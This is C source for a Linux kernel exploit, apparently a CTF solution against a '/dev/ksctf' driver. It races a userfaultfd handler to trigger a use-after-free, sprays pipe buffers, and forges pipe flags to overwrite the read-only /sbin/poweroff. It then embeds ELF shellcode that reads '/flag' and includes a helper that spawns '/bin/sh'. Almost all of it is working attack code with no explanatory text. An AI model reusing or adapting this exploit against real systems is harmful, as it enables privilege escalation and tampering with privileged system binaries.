#define _GNU_SOURCE 
#include<stdio.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<fcntl.h>
#include <stdlib.h>
#include <string.h>
#include<unistd.h>
#include<sys/mman.h>
#include<signal.h>
#include<pthread.h>
#include<linux/userfaultfd.h>
#include <sys/ioctl.h>
#include<syscall.h>
#include<poll.h>
#include <semaphore.h>
#include <sched.h>
#pragma pack(16)
#define __int64 long long
#define CLOSE printf("\033[0m\n");
#define RED printf("\033[31m");
#define GREEN printf("\033[36m");
#define BLUE printf("\033[34m");
#define YELLOW printf("\033[33m");
#define showAddr(var) _showAddr(#var,var);
#define _QWORD unsigned long
#define _DWORD unsigned int
#define _WORD unsigned short
#define _BYTE unsigned char


size_t raw_vmlinux_base = 0xffffffff81000000;
size_t raw_direct_base=0xffff888000000000;
size_t commit_creds = 0,prepare_kernel_cred = 0;
size_t vmlinux_base = 0;
size_t swapgs_restore_regs_and_return_to_usermode=0;
size_t user_cs, user_ss, user_rflags, user_sp;
size_t init_cred=0;
size_t __ksymtab_commit_creds=0,__ksymtab_prepare_kernel_cred=0;
void save_status();
size_t find_symbols();
void _showAddr(char*name,size_t data);
void errExit(char * msg);
void getshell(void);
size_t cvegetbase();
void bind_cpu(int core);
void mypause();
int dev_fd;

sem_t sem[3];
size_t heap_addr;
#define PIPE_COUNT 0x40
#define PIPE_TAG "mowen123"
#define FILE_SPRAY_COUNT 256
typedef struct __attribute__((aligned(16)))
{
   size_t uffd;
   struct uffdio_api uapi;
   struct uffdio_register uregister;
}reg_user,*p_imgae_reg;

void Register_Userfalutfd(void* addr,size_t length,void* (*handler)(void*)){
   YELLOW;printf("Register_Userfalutfd START");CLOSE;
   reg_user reguser={0};
   p_imgae_reg preg=&reguser;
   preg->uffd=syscall(__NR_userfaultfd,__O_CLOEXEC|O_NONBLOCK);
   if(preg->uffd<0){
      errExit("__NR_userfaultfd");
   }
   preg->uapi.api=UFFD_API;
   preg->uapi.features=0;
   if(ioctl(preg->uffd,UFFDIO_API,&preg->uapi)<0)errExit("ioctl ->UFFDIO_API");
   preg->uregister.mode=UFFDIO_REGISTER_MODE_MISSING;
   preg->uregister.range.start=addr;
   preg->uregister.range.len=length;
   if(ioctl(preg->uffd,UFFDIO_REGISTER,&preg->uregister)<0)errExit("ioctl -> UFFDIO_REGISTER");
   pthread_t thread;
   if(pthread_create(&thread,NULL,handler,(void*)preg->uffd)<0)errExit("pthread_create handler");
   YELLOW;printf("Register_Userfalutfd END");CLOSE;
}

void Userfault_Handler(int uffd){
   RED;printf("Userfault_Handler START");CLOSE;
   struct uffd_msg msg={0};
   struct uffdio_copy ufcopy={0};
   size_t* data=(size_t*)mmap(NULL,0x1000,3,0x20|0x2,-1,0);
   if(data<0)errExit("Userfault_Handler mmap");
   *(char*)data=0;
   do
   {
      struct pollfd pf={0};
      pf.fd=uffd;
      pf.events=POLLIN;
      poll(&pf,1,-1);
      read(uffd,&msg,sizeof(msg));
      if(msg.event<=0){
         printf("event NULL");
         continue;
      }
      RED;printf("sem step 0");CLOSE;
      sem_post(&sem[0]);
      sem_wait(&sem[1]);
      RED;printf("sem step 1");CLOSE;
      ufcopy.dst=msg.arg.pagefault.address & ~(sysconf(_SC_PAGE_SIZE)-1);
      ufcopy.src=data;
      ufcopy.len=sysconf(_SC_PAGE_SIZE);
      ufcopy.mode=0;
      ufcopy.copy = 0;
      ioctl(uffd,UFFDIO_COPY,&ufcopy);
      sem_post(&sem[2]);
      RED;printf("sem step 2");CLOSE;
      break;

   } while (1);
   
   RED;printf("Userfault_Handler END");CLOSE;
}
int FILE_spary[20];
void add(){
   char buf[64]={0};
   buf[32]=1;
   size_t* ptr=(size_t*)(buf+32);
   ptr[0]=1;
   ptr[1]=buf;
   ioctl(dev_fd,0xFFF0,buf);
}
void del(){
   char buf[64]={0};
   buf[32]=1;
   size_t* ptr=(size_t*)(buf+32);
   ptr[0]=1;
   ptr[1]=0;
   ioctl(dev_fd,0xFFF1,buf);
}
int pipe_fd[PIPE_COUNT][2];
void uaf(){

   sem_wait(&sem[0]);
   for (size_t i = 0; i < PIPE_COUNT/2; i++)
   {
      if(pipe(pipe_fd[i])<0)errExit("pipe");
      write(pipe_fd[i][1],PIPE_TAG,8);
      write(pipe_fd[i][1],&i,8);
      write(pipe_fd[i][1],PIPE_TAG,8);
   }
   
   del();
   
   for (size_t i = PIPE_COUNT/2; i < PIPE_COUNT; i++)
   {
      if(pipe(pipe_fd[i])<0)errExit("pipe");
      write(pipe_fd[i][1],PIPE_TAG,8);
      write(pipe_fd[i][1],&i,8);
      write(pipe_fd[i][1],PIPE_TAG,8);
   }
   // mypause();
   sem_post(&sem[1]);
}


const char* FileAttack="/dev/ksctf\0";
int file_fd[FILE_SPRAY_COUNT];

int main(void){
   save_status();
   BLUE;puts("[*]start");CLOSE;
   dev_fd = open(FileAttack,2);
    if(dev_fd < 0){
        errExit(FileAttack);
    }
   //初始化信号量
   sem_init(&sem[0],0,0);
   sem_init(&sem[1],0,0);
   sem_init(&sem[2],0,0);

   //初始化缺页处理
   size_t length=sysconf(_SC_PAGE_SIZE);
   size_t map_addr=mmap(0,length,
      PROT_EXEC|PROT_READ|PROT_WRITE,
      MAP_PRIVATE|MAP_ANON,
      -1,
      0);
   Register_Userfalutfd(map_addr,length,Userfault_Handler);

   pthread_t pt;
   pthread_create(&pt,0,(void* (*)(void*))uaf,0);
   //构造缺页报错
   add();

   write(dev_fd,map_addr,1);
   sem_wait(&sem[2]);


   size_t pn=-1;
   for (size_t i = 0; i < PIPE_COUNT; i++)
   {
      char buf[0x100]={0};
      size_t t=-1;
      if( read(pipe_fd[i][0],buf,8) <0 || read(pipe_fd[i][0],&t,8)<0  )
         errExit("pipe read");
      
      if( !strncmp(buf,PIPE_TAG,8) && t!=i ){
         pn=i;
         BLUE; printf("found victim  -> %d",pn); CLOSE;
         char msg_tag[0x30];
         memset(msg_tag,0,sizeof(msg_tag));
         strcat(msg_tag,"mowen_victim");
         write(pipe_fd[i][1],msg_tag,0x2c);
         close(pipe_fd[t][1]);
         close(pipe_fd[t][0]);
         
         break;
      }

   }
   if(pn==-1)errExit("not found victim page");



   for (size_t i = 0; i < FILE_SPRAY_COUNT; i++)
   {
     file_fd[i]=open("/sbin/poweroff",0);
     if(file_fd[i] <0)errExit("file open failed");
   }

   int flags = 0x480e801f;
   write(pipe_fd[pn][1],&flags,4);

   unsigned char shellcode[] = 
   {0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x78,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0xa7,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xa7,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0xbf,0xa8,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x48,0x31,0xf6,0x48,0x31,0xd2,0xb8,0x02,0x00,0x00,0x00,0x0f,0x05,0x48,0x89,0xc6,0x48,0x31,0xff,0x48,0xff,0xc7,0x48,0x31,0xd2,0x68,0x00,0x01,0x00,0x00,0x41,0x5a,0x6a,0x28,0x58,0x0f,0x05,0x00,0x2f,0x66,0x6c,0x61,0x67,0x00}
   ;
   
   for (size_t i = 0; i < FILE_SPRAY_COUNT; i++)
   {
      if( write(file_fd[i],shellcode,sizeof(shellcode)) >0){
         GREEN; printf("change successful");CLOSE;
         break;
      }
   }
   

   BLUE;puts("[*]end");CLOSE;
   return 0;
}


void save_status(){
   __asm__("mov user_cs,cs;"
           "pushf;" //push eflags
           "pop user_rflags;"
           "mov user_sp,rsp;"
           "mov user_ss,ss;"
          );
}



void getshell(void)
{   
    BLUE;printf("[*]Successful");CLOSE;
    system("/bin/sh");
}

void _showAddr(char*name,size_t data){
   GREEN;printf("[*] %s -> 0x%llx ",name,data);CLOSE;
}
void errExit(char * msg){
   RED;printf("[X] Error : %s !",msg);CLOSE;
   exit(-1);
}


